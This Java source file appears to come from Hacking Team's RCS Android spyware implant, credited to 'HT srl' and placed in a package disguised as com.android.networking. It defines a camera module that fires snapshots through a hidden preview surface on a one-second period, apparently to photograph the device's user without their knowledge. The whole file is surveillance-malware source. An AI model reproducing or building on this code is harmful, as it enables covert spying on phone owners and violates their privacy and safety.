/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import java.io.IOException;

import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.view.SurfaceHolder;

import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.gui.AGUI;
import com.android.networking.util.Check;

//SNIPPET http://marakana.com/forums/android/examples/39.html
/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	@Override
	public void actualStart() {
		try {
			snapshot();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(1000);
		return true;
	}

	/**
	 * Snapshot.
	 * 
	 * @throws IOException
	 */
	private synchronized void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		Status.self().preview.click();

	}

}
